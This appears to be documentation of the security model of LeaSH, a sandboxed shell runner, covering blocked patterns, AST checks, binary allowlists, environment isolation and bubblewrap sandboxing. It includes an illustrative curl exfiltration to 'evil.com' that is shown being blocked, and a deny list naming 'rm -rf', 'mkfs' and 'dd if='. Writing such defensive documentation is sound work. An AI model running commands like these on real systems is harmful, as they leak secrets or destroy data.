# Security model

LeaSH applies multiple independent enforcement layers so that a compromised or adversarial script cannot escape the sandbox.

## Enforcement layers

### 1. Blocked patterns (post-expansion)

Blocked patterns are evaluated on the fully-expanded command arguments **after** the shell has interpolated variables from the safe environment. This prevents attacks where malicious content is injected via environment variables:

```yaml
# Script: curl "$MALICIOUS_URL"
# Raw script does NOT contain the pattern
# But after expansion: curl "https://evil.com?token=secret"
#   → blocked!
```

The check uses simple substring matching via `strings.Contains` on the joined command arguments (`args[0] args[1:] ...`) after variable expansion.

```yaml
blocked_patterns:
  - "rm -rf"
  - "mkfs"
  - "dd if="
  - "token=secret"
```

### 2. AST validation (post-parse)

After parsing with the shell AST, LeaSH enforces:

- **Command count** — rejects scripts exceeding `max_commands_per_script`
- **Subshell depth** — rejects scripts exceeding `max_subshells`
- **Background jobs** — `&` is rejected at the AST level regardless of blocked patterns

### 3. Binary allowlist (runtime)

During execution, every command lookup checks against `allowed_binaries`. Commands not in the list return exit code 127 — they are never passed to the OS. Skills are resolved separately and are not subject to the binary allowlist.

### 4. Environment isolation

The host environment is **never inherited**. The engine only exposes variables explicitly declared in `environment.static` or via `WithEnvVar`. This prevents leaking credentials, tokens, or system paths into scripts.

### 5. Rate limiting

Global and per-skill rate limits prevent abuse via tight loops or repeated expensive calls.

### 6. Timeout

Every script execution is wrapped in a `context.WithTimeout`. Scripts that exceed `max_duration` are forcibly cancelled.

### 7. Audit trail

Every command execution — including blocked ones — is recorded in the audit trail with the command name, exit code, duration, block reason, and sandbox backend used. Logs are emitted as structured JSON via `log/slog` to the configured writer.

### 8. Filesystem isolation (sandbox)

LeaSH can wrap every external command in a filesystem sandbox using the `sandbox` block in the policy. Two backends are supported:

| Backend | Description | Requirements |
|---------|-------------|--------------|
| `none` (default) | No isolation — the process inherits the full filesystem | — |
| `bwrap` | Uses [bubblewrap](https://github.com/containers/bubblewrap) namespaces (bind mounts, network isolation, PID isolation) | `bwrap` in `$PATH` |
| `chroot` | `chroot(2)` syscall — restricted to a custom rootfs | Root privileges (Linux only) |

**Bubblewrap** is strongly preferred: it does not require root, isolates the network and PID namespace, and only exposes the paths you explicitly bind-mount.

**Chroot** is provided as a fallback but does not drop capabilities — it is not a true security boundary without additional hardening.

```yaml
sandbox:
  enabled: true
  backend: bwrap
  readonly_binds:
    - /usr
  readwrite_binds:
    - source: /tmp/leash-sandbox
      target: /work
  # On merged-usr systems (Arch, Debian 12+, Ubuntu 22+), recreate symlinks:
  symlinks:
    - source: usr/bin
      target: /bin
    - source: usr/lib
      target: /lib
    - source: usr/lib
      target: /lib64
  tmpfs:
    - /tmp
  workdir: /work
  unshare:
    network: true
    pid: true
    ipc: true
    uts: true
  die_with_parent: true
  persistent_tmp: false # see below
```

The sandbox backend name appears in each audit record as `"sandbox": "bwrap"` (or `"none"`).

### Persistent `/tmp` across commands (`persistent_tmp`)

By default each external command runs in a separate bwrap process with its own fresh tmpfs, so files written to `/tmp` in one command are invisible to the next.

Setting `persistent_tmp: true` replaces the per-process tmpfs with a single host-side temporary directory that is bind-mounted as `/tmp` inside every bwrap process for the duration of a script execution. Files written to `/tmp` by any command — whether via shell redirections or OS binaries — are visible to all subsequent commands in the same script.

```yaml
sandbox:
  enabled: true
  backend: bwrap
  tmpfs:
    - /tmp          # required — persistent_tmp replaces this entry
  persistent_tmp: true
```

The shared directory is created with `os.MkdirTemp` at the start of each `ExecWithStreams` call and removed when the call returns. All other security layers (binary allowlist, blocked patterns, rate limiting, audit trail) remain fully active.

## Skill confirmation

Sensitive skills can be protected with a confirmation mechanism. When a skill is listed under `require_confirmation`, it will only execute if the environment contains `CONFIRM_<SKILL_NAME>=yes`. This allows callers to explicitly opt in to high-impact operations.

```yaml
skills:
  require_confirmation:
    - deploy
    - delete-records
```

## What LeaSH does NOT provide

- **Full container isolation** — bubblewrap provides namespace-level isolation but is not equivalent to a container runtime. Use Docker/Podman for stronger guarantees.
- **Network isolation without bwrap** — with the `none` sandbox, allowed binaries can make network calls. Use `unshare.network: true` with bwrap to prevent this.
- **Process isolation** — the shell runner shares the same process as LeaSH. Use containers for full isolation.
